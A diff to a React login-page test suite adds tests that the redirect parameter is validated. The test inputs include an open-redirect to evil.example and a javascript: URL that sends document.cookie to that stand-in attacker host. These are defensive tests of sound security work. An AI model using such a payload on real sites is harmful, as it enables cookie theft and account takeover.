@@ -22,10 +22,16 @@ import { fireEvent, screen, waitFor } from '@testing-library/react';
 jest.mock('react-router', () => jest.requireActual('../router-mock'));
 jest.mock('../../../../src/components/seo', () => ({ SEOHead: () => null }));
 jest.mock('../../../../src/utils/analytics', () => ({ trackPageView: jest.fn() }));
+jest.mock('../../../../src/utils/redirect', () => ({
+  ...jest.requireActual('../../../../src/utils/redirect'),
+  leaveTo: jest.fn(),
+}));
 
 import LoginPage from '../../../../src/components/login-page';
 import Client from '../../../../src/classes/client';
 import { trackPageView } from '../../../../src/utils/analytics';
+import { leaveTo } from '../../../../src/utils/redirect';
+import { takeOAuthFlow } from '../../../../src/utils/oauth-flow';
 import { appLogger } from '../../../../src/utils/logger';
 import { BURST_TEXT, typeInBurst } from '../../burst-typing';
 import { initAppConfig, installMatchMedia, renderPage, useConfig } from '../helpers';
@@ -60,7 +66,39 @@ describe('LoginPage', () => {
     resetRouter();
     installMatchMedia(false);
     localStorage.clear();
+    sessionStorage.clear();
     jest.mocked(trackPageView).mockClear();
+    jest.mocked(leaveTo).mockClear();
+  });
+
+  test('a signed-in user goes to the page in redirect', async () => {
+    setup('/c/login?redirect=%2Fc%2Fmaps%2F3%2Fedit', true);
+    await waitFor(() => expect(leaveTo).toHaveBeenCalledWith('/c/maps/3/edit'));
+  });
+
+  test.each([
+    ['javascript:fetch(%22//evil.example?%22%2Bdocument.cookie)'],
+    ['https%3A%2F%2Fevil.example%2F'],
+    ['%2F%2Fevil.example'],
+  ])('a signed-in user is not sent to redirect=%s', async (redirect) => {
+    setup(`/c/login?redirect=${redirect}`, true);
+    await waitFor(() => expect(leaveTo).toHaveBeenCalledWith('/c/maps/'));
+  });
+
+  test('after signing in, an unsafe redirect goes to the map list instead', async () => {
+    setup('/c/login?redirect=javascript:alert(1)');
+
+    await fillAndSubmit('ana@wisemapping.com', 'secret');
+
+    await waitFor(() => expect(leaveTo).toHaveBeenCalledWith('/c/maps/'));
+  });
+
+  test('after signing in, a safe redirect is followed', async () => {
+    setup('/c/login?redirect=%2Fc%2Fmaps%2F9%2Fedit');
+
+    await fillAndSubmit('ana@wisemapping.com', 'secret');
+
+    await waitFor(() => expect(leaveTo).toHaveBeenCalledWith('/c/maps/9/edit'));
   });
 
   test('a signed-in user is redirected instead of seeing the form', async () => {
@@ -188,6 +226,10 @@ describe('LoginPage', () => {
 
     // A configured provider is navigated to, not reported as missing.
     expect(log).not.toHaveBeenCalled();
+    expect(leaveTo).toHaveBeenCalledWith('https://accounts.example.com/auth?state=%2Fc%2Fmaps%2F3');
+    expect(leaveTo).toHaveBeenCalledWith('https://facebook.example.com/auth?state=%2Fc%2Fmaps%2F3');
+    // The callback can tell that the sign-in was started here.
+    expect(takeOAuthFlow()).toMatchObject({ redirect: '/c/maps/3' });
   });
 
   test('a provider without a URL is reported and not navigated to', async () => {
